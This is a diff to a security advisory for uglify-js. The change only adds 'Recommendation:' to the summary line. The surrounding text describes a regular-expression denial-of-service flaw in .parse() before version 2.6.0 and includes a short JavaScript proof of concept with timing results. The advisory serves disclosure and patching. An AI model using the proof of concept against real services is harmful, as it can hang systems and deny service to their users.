@@ -17,7 +17,7 @@ Schema-Version: '1.0'
 SPDX-License-Identifier: CC-BY-4.0
 ---
 ### Summary
-*Regular Expression Denial of Service*<br><br>Update to version 2.6.0 or later
+*Regular Expression Denial of Service*<br><br>Recommendation: Update to version 2.6.0 or later
 ### Details
 uglify-js is vulnerable to regular expression denial of service (ReDoS) when certain types of input is passed into .parse().  "The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time." [1]  ### Proof of Concept  ``` var u = require('uglify-js'); var genstr = function (len, chr) {     var result = "";     for (i=0; i<=len; i++) {         result = result + chr;     }      return result; }  u.parse("var a = " + genstr(process.argv[2], "1") + ".1ee7;"); ```  ### Results ``` $ time node test.js 10000 real	0m1.091s user	0m1.047s sys	0m0.039s  $ time node test.js 80000 real	0m6.486s user	0m6.229s sys	0m0.094s ```
 <br><br>• Affected Versions: <2.6.0
